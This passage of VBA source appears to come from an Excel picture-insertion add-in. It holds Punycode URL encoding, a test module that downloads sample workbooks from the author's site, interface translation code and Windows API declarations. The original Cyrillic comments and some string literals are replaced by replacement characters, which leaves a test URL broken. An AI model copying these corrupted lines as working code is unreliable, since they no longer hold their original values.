    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| http://xn--80aebe3cdmfdkg.xn--d1abbgf6aiiy.xn--p1ai/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B
    ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|), |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| URLencode

    On Error Resume Next
    Dim arr, Host$, i&, l$, t$, txt$
    arr = Split(URL$, "/")
    arr(2) = EncodeHost(arr(2))        ' Punycode
    txt$ = Join(arr, "/")

    For i = 1 To Len(txt)
        l = Mid(txt, i, 1)

        Select Case AscW(l)
            Case Is > 4095: t = "%" & Hex(AscW(l) \ 64 \ 64 + 224) & "%" & Hex(AscW(l) \ 64) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case Is > 127: t = "%" & Hex(AscW(l) \ 64 + 192) & "%" & Hex(8 * 16 + AscW(l) Mod 64)
            Case 32: t = "%20"
            Case Else: t = l
        End Select

        ConvertURLtoPunycode = ConvertURLtoPunycode & t
    Next
End Function

Private Sub |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|_ConvertURLtoPunycode()
    Dim Host$, newURL$

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    Host$ = "http://|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|.|fffd||fffd|/|fffd||fffd||fffd||fffd||fffd||fffd|"

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: http://xn--80aebe3cdmfdkg.xn--d1abbgf6aiiy.xn--p1ai/%D1%81%D0%BE%D0%B2%D0%B5%D1%82%D1%8B
    newURL$ = ConvertURLtoPunycode(Host$)
    MsgBox newURL$
End Sub

Public Function EncodeHost(ByVal name As String) As String
    If Len(name) = 0 Then Exit Function
    Dim arrLevels() As String, t As Long

    arrLevels = Split(name, ".")
    For t = 0 To UBound(arrLevels)
        arrLevels(t) = Replace(arrLevels(t), "?", "ss")
        arrLevels(t) = Encode(arrLevels(t))
    Next t
    EncodeHost = Join(arrLevels, ".")
End Function

Public Function DecodeHost(name As String) As String
    If Len(name) = 0 Then Exit Function
    Dim arrLevels() As String, t As Long
    arrLevels = Split(name, ".")
    For t = 0 To UBound(arrLevels)
        If Left$(LCase$(arrLevels(t)), 4) = "xn--" Then
            arrLevels(t) = Decode(Mid$(arrLevels(t), 5))
        End If
    Next t
    DecodeHost = Join(arrLevels, ".")
End Function
'********************************************************************************

Private Function Encode(text As String) As String
    On Error GoTo Ende
    Dim n&, delta&, bias&, b&, output$, l&, c$, H&, q&, m&, k&, t&
    bias = INITIAL_BIAS: n = INITIAL_N
    For l = 1 To Len(text)
        c = Mid$(text, l, 1)
        If IsBasic(c, INITIAL_N) Then output = output & c: b = b + 1
    Next l
    If Len(output) < Len(text) Then
        If Len(output) > 0 Then output = output & "-"
        output = "xn--" & output
    End If

    H = b
    While H < Len(text)
        m = GetMinCodePoint(n, text)
        delta = delta + UInt(m - n) * (H + 1)
        n = m
        For l = 1 To Len(text)
            c = Mid$(text, l, 1)
            If IsBasic(c, n) Then
                delta = delta + 1
            ElseIf UInt(AscW(c)) = n Then
                q = delta
                For k = BASE To &H7FFFFFFF Step BASE
                    If k <= bias + TMIN Then
                        t = TMIN
                    ElseIf k >= bias + TMAX Then
                        t = TMAX
                    Else
                        t = k - bias
                    End If
                    If q < t Then Exit For
                    output = output & Chr(Digit2Codepoint(t + ((q - t) Mod (BASE - t))))
                    Let q = (q - t) \ (BASE - t)
                Next k
                output = output & Chr(Digit2Codepoint(q))
                bias = Adapt(delta, H + 1, (H = b))
                delta = 0: H = H + 1
            End If
        Next l
        delta = delta + 1: n = n + 1
    Wend

Ende:
    Encode = output
End Function

Private Function Decode(text As String) As String
    On Error GoTo Ende
    Dim n&, i&, bias&, output$, l&, pos&, c$, oldi&, w&, k&, digit As Byte, t&
    n = INITIAL_N: bias = INITIAL_BIAS
    pos = InStrRev(text, "-")
    If pos > 0 Then
        For l = 1 To pos - 1
            c = Mid$(text, l, 1)
            If IsBasic(c, INITIAL_N) Then output = output & c Else Exit Function
        Next l
    End If

    pos = pos + 1
    Do While (pos <= Len(text))
        oldi = i: w = 1
        For k = BASE To &H7FFFFFFF Step BASE
            If pos > Len(text) Then Exit For        'out of code points
            c = Mid$(text, pos, 1)
            pos = pos + 1
            digit = Codepoint2Digit(Asc(c))
            If digit = 255 Then Exit Function        'bad code point
            i = i + digit * w
            If k <= bias Then
                t = TMIN
            ElseIf k >= bias + TMAX Then
                t = TMAX
            Else
                t = k - bias
            End If
            If digit < t Then Exit For
            w = w * (BASE - t)
        Next k
        bias = Adapt(i - oldi, Len(output) + 1, (oldi = 0))
        n = n + i \ (Len(output) + 1)
        i = i Mod (Len(output) + 1)
        If IsBasic(ChrW(n), INITIAL_N) Then Exit Function        'shouldn't be a basic code point
        output = Left$(output, i) & ChrW(n) & Mid$(output, i + 1)
        i = i + 1
    Loop
Ende:
    Decode = output
End Function

Private Function GetMinCodePoint(ByVal n As Long, ByVal data As String) As Long
    Dim t&, a&, Result&
    Result = &H7FFFFFFF
    For t = 1 To Len(data)
        a = UInt(AscW(Mid$(data, t, 1)))
        If (a >= n) And (a < Result) Then Result = a
    Next t
    GetMinCodePoint = Result
End Function

Private Function IsBasic(c As String, ByVal n As Long) As Boolean
    IsBasic = (UInt(AscW(c)) < n)
End Function

Private Function Adapt(ByVal delta As Long, ByVal numpoints As Long, ByVal firsttime As Boolean) As Long
    Dim k As Long
    If (firsttime) Then delta = delta \ DAMP Else delta = delta \ 2
    delta = delta + (delta \ numpoints)
    k = 0
    While (delta > ((BASE - TMIN) * TMAX) \ 2)
        delta = delta \ (BASE - TMIN)
        k = k + BASE
    Wend
    Adapt = k + (((BASE - TMIN + 1) * delta) \ (delta + SKEW))
End Function

Private Function Digit2Codepoint(ByVal d As Long) As Long
    If (d < 26) Then
        Digit2Codepoint = d + &H61        'a'
    ElseIf (d < 36) Then
        Digit2Codepoint = d - 26 + &H30        '0'
    Else
        Debug.Print "Error in Function Digit2Codepoint"
    End If
End Function

Private Function Codepoint2Digit(ByVal c As Long) As Long
    If (c - &H30 < 10) Then        '0'
        Codepoint2Digit = 26 + c - &H30        '0'
    ElseIf (c - &H41 < 26) Then        'a'
        Codepoint2Digit = c - &H41        'a'
    ElseIf (c - &H61 < 26) Then        'A'
        Codepoint2Digit = c - &H61        'A'
    Else
        Codepoint2Digit = 255
        Debug.Print "Error in Function Codepoint2Digit"
    End If
End Function

Private Function UInt(i As Integer) As Long
    If i < 0 Then UInt = 2 ^ 16 + i Else UInt = i
End Function


Attribute VB_Name = "mod_TestProgram"
'---------------------------------------------------------------------------------------
' Module        : mod_TestProgram                    Version:
' Author        : Igor Vakhnenko                   Date: 08.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit

Public Const ExcelTableExample1$ = "filenames.xls"
Public Const ExcelTableExample2$ = "links.xls"
Const TEST_FILE_NAME_LOCAL1$ = "PastePictures add-in test - filenames.xls"
Const TEST_FILE_NAME_LOCAL2$ = "PastePictures add-in test - hyperlinks.xls"

Sub DownloadAndOpenExcelTable1()
    DownloadAndOpenExcelTable 1
End Sub

Sub DownloadAndOpenExcelTable2()
    DownloadAndOpenExcelTable 2
End Sub

Function DownloadAndOpenExcelTable(ByVal ind&) As Boolean
    On Error Resume Next: Dim URL$, filename$, tmpXLSpath$
    URL$ = "http://excelvba.ru/resources/PastePictures/" & Choose(ind&, ExcelTableExample1$, ExcelTableExample2$)
    filename$ = Choose(ind&, TEST_FILE_NAME_LOCAL1$, TEST_FILE_NAME_LOCAL2$)

    Err.Clear: Workbooks(filename$).Activate
    If Err = 0 Then
        DownloadAndOpenExcelTable = True
        TranslateWorkbook Workbooks(filename$)
        Exit Function
    End If

    tmpXLSpath$ = FWF.temp_folder & filename$

    If FWF.DownLoadFileFromURL(URL$, tmpXLSpath$) Then
        TranslateWorkbook Workbooks.Open(tmpXLSpath$)
        DownloadAndOpenExcelTable = True
    Else
        MsgBox tt("TEST_MSG_ErrorDownloadingWorkbook"), vbCritical, tt("TEST_MSG_ErrorDownloadingWorkbook_Title")
    End If
End Function

Function DownloadPicturesFromWebsite() As Boolean
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL1$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    Dim arr: arr = Workbooks(TEST_FILE_NAME_LOCAL1$).Worksheets("download list").Range("DownloadList").Value
    If Not IsArray(arr) Then MsgBox tt("TEST_MSG_DownloadListNotFound"), vbCritical: Exit Function

    Dim pi As New ProgressIndicator, i&, res&, fileslist$, msg$
    pi.Show tt("TEST_Download_PI_Caption")
    pi.StartNewAction , , , , , UBound(arr)
    For i = LBound(arr) To UBound(arr)
        pi.SubAction tt("TEST_Download_PI_Line1", "$index", "$count", arr(i, 2))
        res = res - FWF.DownLoadFileFromURL(arr(i, 1), PICTURES_FOLDER$ & arr(i, 2))
        fileslist$ = fileslist$ & i & "." & vbTab & arr(i, 2) & vbNewLine
    Next i
    pi.Hide

    DownloadPicturesFromWebsite = res = UBound(arr)

    msg$ = tt("TEST_MSG_DownloadPictures_Result", res & vbNewLine, vbNewLine & fileslist$, vbNewLine & PICTURES_FOLDER$)
    MsgBox msg, vbInformation, tt("TEST_MSG_DownloadPictures_ResultTitle")
End Function

Function UsageExampleMacro1() As Boolean        ' into cells
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL1$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    SETT.Reset
    SETT.SetText "TextBox_FirstCell", "B2"
    SETT.SetText "ComboBox_PicturesColumn", "4 |fffd|D|fffd|"
    SETT.SetText "CheckBox_Cells", True
    SETT.SetText "CheckBox_Comments", False
    SETT.SetText "CheckBox_CloseProgressBar", True

    InsertPicsFromFolder
    UsageExampleMacro1 = True
End Function

Function UsageExampleMacro2() As Boolean        ' into comments
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL1$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    SETT.Reset
    SETT.SetText "TextBox_FirstCell", "B2"
    SETT.SetText "ComboBox_CommentsColumn", "2 |fffd|B|fffd|"
    SETT.SetText "CheckBox_Cells", False
    SETT.SetText "CheckBox_Comments", True
    SETT.SetText "CheckBox_CloseProgressBar", True

    InsertPicsFromFolder
    UsageExampleMacro2 = True
End Function

Function UsageExampleMacro3() As Boolean        ' into cells
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL2$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    SETT.Reset
    SETT.SetText "TextBox_FirstCell", "B2"
    SETT.SetText "ComboBox_PicturesColumn", "3 |fffd|C|fffd|"
    SETT.SetText "CheckBox_Cells", True
    SETT.SetText "CheckBox_Comments", False
    SETT.SetText "CheckBox_CloseProgressBar", True
    SETT.SetText "CheckBox_AddHyperlinksForPictures", True

    SETT.SetText "CheckBox_RenameDownloadedPictures", True
    SETT.SetText "ComboBox_DownloadedFilenames_Column", "1 |fffd|A|fffd|"

    InsertPicsFromLinks
    UsageExampleMacro3 = True
End Function

Function UsageExampleMacro4() As Boolean        ' into comments
    On Error Resume Next: Err.Clear
    Workbooks(TEST_FILE_NAME_LOCAL2$).Activate
    If Err <> 0 Then MsgBox tt("TEST_MSG_ErrorConnectingTestWorkbook"), vbCritical: Exit Function

    SETT.Reset
    SETT.SetText "TextBox_FirstCell", "B2"
    SETT.SetText "ComboBox_CommentsColumn", "1 |fffd|A|fffd|"
    SETT.SetText "CheckBox_Cells", False
    SETT.SetText "CheckBox_Comments", True
    SETT.SetText "CheckBox_CloseProgressBar", True

    SETT.SetText "CheckBox_Add_ImageSizeOriginal", True
    SETT.SetText "ComboBox_ImageSizeOriginalColumn", "4 |fffd|D|fffd|"
    SETT.SetText "CheckBox_RenameDownloadedPictures", True
    SETT.SetText "ComboBox_DownloadedFilenames_Column", "1 |fffd|A|fffd|"

    InsertPicsFromLinks
    UsageExampleMacro4 = True
End Function

Attribute VB_Name = "mod_Translate"
'---------------------------------------------------------------------------------------
' Module        : mod_Translate                    Version: 2.2
' Author        : Igor Vakhnenko                   Date: 02.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module: Option Compare Text: Option Explicit
Public Const TRANSLATE_SHEET_FIRST_ROW& = 5, DEFAULT_LANGUAGE$ = "en"
Dim DoNotTranslate As Boolean

Function TR_DIC() As Dictionary
    Static objTRDIC As Dictionary
    If Not objTRDIC Is Nothing Then
        Set TR_DIC = objTRDIC: Exit Function
    Else
        Set objTRDIC = New Dictionary: objTRDIC.CompareMode = TextCompare
        PrepareTraslateDictionary
        Set TR_DIC = objTRDIC
    End If
End Function

Sub TranslateUserForm(ByRef UF As Object)
    If DoNotTranslate Then Exit Sub
    On Error Resume Next: Dim ctrl As MSForms.Control, fcaption$
    fcaption$ = tt(UF.name & "_caption"): If Len(fcaption$) Then UF.Caption = fcaption$
    For Each ctrl In UF.Controls
        UpdateControl ctrl, UF.name
    Next
End Sub

Sub UpdateControl(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim m_page As Object, ID$, res$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            UpdateControl m_page, ParentName$ & "\" & ctrl.name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
        res$ = tt(ID$)
        If Len(res$) Then ctrl.Caption = res$

        If Len(ctrl.Tag) Then
            ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.Tag = res$
        End If

        If Len(ctrl.ControlTipText) Then
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
            res$ = tt(ID$)
            If Len(res$) Then ctrl.ControlTipText = res$
        End If
    End If
End Sub


' ===================== prepare translations ==========================
Private Sub loadInfo_UserForms()
    On Error Resume Next
    DoNotTranslate = True

    ' PrintWords UsageExample

    ' PrintWords F_FirstRun
    DoNotTranslate = False
End Sub

Private Sub PrintUserformNames()
    On Error Resume Next
    Dim VBComp As Object
    For Each VBComp In ThisWorkbook.VBProject.VBComponents
        If VBComp.Type = 3 Then Debug.Print VBComp.name
    Next VBComp
End Sub

Sub PrintWords(ByRef UF As Object)
    On Error Resume Next
    shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(2) = UF.name & " controls"
    Dim ctrl As MSForms.Control
    For Each ctrl In UF.Controls
        AddControlInformation ctrl, UF.name
    Next
End Sub

Sub AddControlInformation(ByRef ctrl As Object, Optional ByVal ParentName$)
    On Error Resume Next
    Dim cell As Range, m_page As Object, ID$
    If TypeName(ctrl) = "MultiPage" Then
        For Each m_page In ctrl.Pages
            AddControlInformation m_page, ParentName$ & "\" & ctrl.name
        Next
    Else
        ID$ = ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
        Debug.Print ID$
        If Len(ctrl.Caption) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            cell.Resize(, 2).Value = Array(ID$, ctrl.Caption)
        End If

        If Len(ctrl.Tag) Then
            If ctrl.Tag <> "ScrollCombo" Then
                Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
                ID$ = "tag:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
                cell.Resize(, 2).Value = Array(ID$, ctrl.Tag)
            End If
        End If

        If Len(ctrl.ControlTipText) Then
            Set cell = shtr.Range("a" & shtr.Rows.Count).End(xlUp).Offset(1)
            ID$ = "ControlTipText:" & ParentName$ & IIf(ParentName$ <> "", "\", "") & ctrl.name
            cell.Resize(, 2).Value = Array(ID$, ctrl.ControlTipText)
        End If
    End If
End Sub

Function SYSTEM_LANGUAGE() As String
    On Error Resume Next
    Select Case Application.LanguageSettings.LanguageID(msoLanguageIDUI)
        Case 1049: SYSTEM_LANGUAGE = "ru"
        Case Else: SYSTEM_LANGUAGE = DEFAULT_LANGUAGE
    End Select
End Function

Function SetLanguage(ByVal new_lang_code$) As Boolean
    ' returns TRUE if language was changed (interface needs to be translated)
    On Error Resume Next
    Dim prev_lang_code$: prev_lang_code$ = GetLanguage
    SETT.SetText "Language", new_lang_code$, "Setup"

    SetLanguage = LCase(prev_lang_code$) <> LCase(new_lang_code$)
    If SetLanguage Then PrepareTraslateDictionary        ': CreateProgramCommandBar
End Function

Function GetLanguage() As String
    GetLanguage = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE)
End Function

Function RUS() As Boolean
    RUS = SETT.GetText("Setup\Language", SYSTEM_LANGUAGE) = "ru"
End Function

Function tt(ByVal ID$, ParamArray tokens()) As String
    On Error Resume Next: Dim i&, AddSpaces As Boolean
    If ID$ Like "|??*" Then ID$ = SETT.U(Mid(ID$, 2))
    If ID$ Like " ?*" Then ID$ = Mid(ID$, 2): AddSpaces = True
    tt = TR_DIC.Item(ID$)
    If Not IsMissing(tokens) Then
        For i = LBound(tokens) To UBound(tokens)
            tt = Replace(tt, "!" & (i + 1), tokens(i))
        Next i
    End If
    tt = Replace(tt, "!add-in", PROJECT_NAME$)
    tt = Replace(tt, "/n", vbNewLine)
    If AddSpaces Then tt = " " & tt & " "
End Function

Function PrepareTraslateDictionary()
    On Error Resume Next: Err.Clear
    Dim ra As Range, KEYarr As Variant, VALarr As Variant, AvLangArr As Variant, col&, lang_code$, i&, k, v$
    Set ra = shtr.Range(shtr.Cells(TRANSLATE_SHEET_FIRST_ROW, 1), shtr.Range("A" & shtr.Rows.Count).End(xlUp))
    If ra.row < TRANSLATE_SHEET_FIRST_ROW Then
        MsgBox "Translation sheet has no data", vbCritical, "Contact the developer"
        End
    End If

    lang_code$ = GetLanguage: AvLangArr = AvailableLanguagesArray(True)
    For i = LBound(AvLangArr) To UBound(AvLangArr)
        If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
    Next i

    If col& = 0 Then
        lang_code$ = DEFAULT_LANGUAGE
        For i = LBound(AvLangArr) To UBound(AvLangArr)
            If LCase(AvLangArr(i, 1)) = LCase(lang_code$) Then col& = i: Exit For
        Next i
    End If

    If col& = 0 Then
        MsgBox "Translation error: unsupported language |fffd|" & GetLanguage & "|fffd|", vbCritical, "Contact the developer"
        End
    End If

    KEYarr = ra.Value
    VALarr = ra.Offset(, col&).Value

    With TR_DIC
        .RemoveAll
        .CompareMode = TextCompare
        For i = LBound(KEYarr) To UBound(KEYarr)
            v$ = VALarr(i, 1)
            For Each k In Split(KEYarr(i, 1), "|")
                If Len(k) Then If Not .Exists(CStr(k)) Then .Item(CStr(k)) = v$
            Next k
        Next i
    End With
End Function

Function AvailableLanguagesArray(Optional FullList As Boolean = False) As Variant
    On Error Resume Next: Err.Clear
    Dim ra As Range, arr, res, i&, ii&, dic As New Dictionary, ind&, CurrLangPresentInList As Boolean, CurrLanguage$, CurrLanguageColumn&
    Set ra = shtr.Range(shtr.[b1], shtr.Range("z1").End(xlToLeft)).Resize(4)
    If Err Then
        MsgBox "Translation sheet is absent", vbCritical, "Contact the developer"
        End
    End If
    If ra.Column < 2 Then
        MsgBox "Translation sheet is blank", vbCritical, "Contact the developer"
        End
    End If

    If FullList Then
        AvailableLanguagesArray = Application.Transpose(ra.Value)
        Exit Function
    End If

    arr = ra.Value
    ind& = 0: dic.CompareMode = TextCompare: CurrLanguage$ = GetLanguage
    For ii = LBound(arr, 2) To UBound(arr, 2)
        If arr(1, ii) = CurrLanguage$ Then CurrLanguageColumn& = ii
        For i = LBound(arr, 2) To UBound(arr, 2)
            If Val(arr(4, i)) = ii Then
                ind& = ind& + 1: dic.Item(ind&) = i
                If arr(1, i) = CurrLanguage$ Then CurrLangPresentInList = True
            End If
        Next i
    Next ii
    If Not CurrLangPresentInList Then If CurrLanguageColumn& Then dic.Item(ind& + 1) = CurrLanguageColumn&

    If ind& = 0 Then
        MsgBox "Translation sheet error: can't find language indexes", vbCritical, "Contact the developer"
        End
    End If

    ReDim res(1 To dic.Count, 1 To 2)
    For i = LBound(res) To UBound(res)
        res(i, 1) = arr(1, dic.Item(i))
        res(i, 2) = arr(2, dic.Item(i))
    Next i

    AvailableLanguagesArray = res
    Set dic = Nothing
End Function

Sub OneMoreSettingsForm()
    SetLanguage "en"
    With New F_Settings
        .Show
    End With
End Sub

Sub TranslateWorkbook(ByRef WB As Workbook)
    On Error Resume Next:    Dim n As name, txt$
    For Each n In WB.Names
        'Debug.Print n.Name & vbTab & n.RefersToRange.Value
        txt$ = tt(n.name)
        If Len(txt) Then n.RefersToRange.Cells(1).Value = txt
    Next
End Sub

'Function TranslateHyperlink(ByVal URL$, Optional ByVal ForTip As Boolean = False) As String
'    On Error Resume Next
'    TranslateHyperlink = URL$
'    LangCode$ = GetLanguageCode$
'    If LangCode$ = "ru" Or LangCode$ = "" Then Exit Function
'    ' If ForTip Then TranslateHyperlink = "Translation of " & URL$: Exit Function
'    If ForTip Then TranslateHyperlink = "(Russian -> " & GetLanguage$ & ") " & URL$: Exit Function
'    TranslateHyperlink = "http://translate.google.com/translate?sl=ru&tl=" & LangCode$ & "&u=" & URLEncode(URL$)
'End Function



Attribute VB_Name = "mod_WinAPI"
'---------------------------------------------------------------------------------------
' Module        : mod_WinAPI                    Version:
' Author        : Igor Vakhnenko                   Date: 09.05.2016
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Private Module
' ----==== API Declarations ====---- http://www.mvps.org/emorcillo/en/code/vb6/savejpggdip.shtml

#If VBA7 Then
    Declare PtrSafe Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long
#Else
    Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As Any, ByVal lpString2 As Any) As Long
#End If


#If VBA7 Then
    Declare PtrSafe Function CopyEnhMetaFile Lib "gdi32" Alias "CopyEnhMetaFileA" (ByVal hemfSrc As LongPtr, ByVal lpszFile As String) As LongPtr
    Declare PtrSafe Function DeleteEnhMetaFile Lib "gdi32.dll" (ByVal hemf As LongPtr) As LongPtr

    Declare PtrSafe Function IsClipboardFormatAvailable Lib "user32" (ByVal wFormat As Integer) As LongPtr
    Declare PtrSafe Function OpenClipboard Lib "user32" (ByVal hwnd As LongPtr) As LongPtr
    Declare PtrSafe Function GetClipBoardData Lib "user32" Alias "GetClipboardData" (ByVal wFormat As Integer) As LongPtr
    Declare PtrSafe Function CloseClipboard Lib "user32" () As LongPtr
    Declare PtrSafe Function CopyImage Lib "user32" (ByVal Handle As LongPtr, ByVal un1 As LongPtr, ByVal n1 As LongPtr, ByVal n2 As LongPtr, ByVal un2 As LongPtr) As LongPtr

    Declare PtrSafe Function GdipCreateBitmapFromHBITMAP Lib "GDIPlus" (ByVal hbm As LongPtr, ByVal hPal As LongPtr, bitmap As LongPtr) As LongPtr
    Declare PtrSafe Function GdipSaveImageToFile Lib "GDIPlus" (ByVal Image As LongPtr, ByVal filename As LongPtr, clsidEncoder As GUID, encoderParams As Any) As LongPtr
    Declare PtrSafe Function CLSIDFromString Lib "ole32" (ByVal str As LongPtr, ID As GUID) As LongPtr

    Declare PtrSafe Function GdiplusStartup Lib "GDIPlus" (token As LongPtr, inputbuf As GdiplusStartupInput, Optional ByVal outputbuf As LongPtr = 0) As GpStatus
    Declare PtrSafe Function GdipCreateBitmapFromFile Lib "GDIPlus" (ByVal filename As LongPtr, bitmap As LongPtr) As GpStatus
    Declare PtrSafe Function GdipCreateHBITMAPFromBitmap Lib "GDIPlus" (ByVal bitmap As LongPtr, hbmReturn As LongPtr, ByVal background As LongPtr) As GpStatus
    Declare PtrSafe Function GdipDisposeImage Lib "GDIPlus" (ByVal Image As LongPtr) As GpStatus
    Declare PtrSafe Function GdiplusShutdown Lib "GDIPlus" (ByVal token As LongPtr) As LongPtr
    'Declare PtrSafe Function OleCreatePictureIndirect Lib "olepro32.dll" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As LongPtr, IPic As IPicture) As LongPtr
    Declare PtrSafe Function OleCreatePictureIndirect Lib "oleaut32.dll" (PicDesc As PICTDESC, RefIID As GUID, ByVal fPictureOwnsHandle As LongPtr, IPic As IPicture) As LongPtr

    Declare PtrSafe Function GdipGetImageDimension Lib "GDIPlus" (ByVal Image As LongPtr, Width As Single, Height As Single) As GpStatus
    Declare PtrSafe Function GdipGetImageWidth Lib "GDIPlus" (ByVal Image As LongPtr, Width As LongPtr) As GpStatus
    Declare PtrSafe Function GdipGetImageHeight Lib "GDIPlus" (ByVal Image As LongPtr, Height As LongPtr) As GpStatus
    Declare PtrSafe Function GdipGetImageHorizontalResolution Lib "GDIPlus" (ByVal Image As LongPtr, resolution As Single) As GpStatus
    Declare PtrSafe Function GdipGetImageVerticalResolution Lib "GDIPlus" (ByVal Image As LongPtr, resolution As Single) As GpStatus
    Declare PtrSafe Function GdipGetImageThumbnail Lib "GDIPlus" (ByVal Image As LongPtr, ByVal thumbWidth As LongPtr, ByVal thumbHeight As LongPtr, thumbImage As LongPtr, _
                                                                  Optional ByVal callback As LongPtr = 0, Optional ByVal callbackData As LongPtr = 0) As GpStatus
    Declare PtrSafe Function GdipLoadImageFromFile Lib "GDIPlus" (ByVal filename As String, Image As LongPtr) As GpStatus
    Declare PtrSafe Function SHCreateDirectoryEx Lib "shell32" Alias "SHCreateDirectoryExA" (ByVal hwnd As LongPtr, ByVal pszPath As String, ByVal psa As Any) As LongPtr

    Declare PtrSafe Function CreateCompatibleDC Lib "gdi32" (ByVal hDC As LongPtr) As LongPtr
    Declare PtrSafe Function CreateCompatibleBitmap Lib "gdi32" (ByVal hDC As LongPtr, ByVal nWidth As LongPtr, ByVal nHeight As LongPtr) As LongPtr
    Declare PtrSafe Function GetDeviceCaps Lib "gdi32" (ByVal hDC As LongPtr, ByVal nIndex As LongPtr) As LongPtr
    Declare PtrSafe Function PatBlt Lib "gdi32" (ByVal hDC As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr, ByVal nWidth As LongPtr, ByVal nHeight As LongPtr, ByVal dwRop As LongPtr) As LongPtr
    Declare PtrSafe Function CreateBitmap Lib "gdi32" (ByVal nWidth As LongPtr, ByVal nHeight As LongPtr, ByVal nPlanes As LongPtr, ByVal nBitCount As LongPtr, lpBits As Any) As LongPtr
    Declare PtrSafe Function SelectObject Lib "gdi32" (ByVal hDC As LongPtr, ByVal hObject As LongPtr) As LongPtr
    Declare PtrSafe Function CreateSolidBrush Lib "gdi32" (ByVal crColor As LongPtr) As LongPtr
    Declare PtrSafe Function DeleteObject Lib "gdi32" (ByVal hObject As LongPtr) As LongPtr
    Declare PtrSafe Function DeleteDC Lib "gdi32" (ByVal hDC As LongPtr) As LongPtr
    Declare PtrSafe Function GdipCreateFromHDC Lib "gdiplus.dll" (ByVal hDC As LongPtr, GpGraphics As LongPtr) As LongPtr
    Declare PtrSafe Function GdipSetInterpolationMode Lib "gdiplus.dll" (ByVal Graphics As LongPtr, ByVal InterMode As LongPtr) As LongPtr
    Declare PtrSafe Function GdipDrawImageRectI Lib "gdiplus.dll" (ByVal Graphics As LongPtr, ByVal Img As LongPtr, ByVal X As LongPtr, ByVal y As LongPtr, ByVal Width As LongPtr, ByVal Height As LongPtr) As LongPtr
    Declare PtrSafe Function GdipDeleteGraphics Lib "gdiplus.dll" (ByVal Graphics As LongPtr) As LongPtr
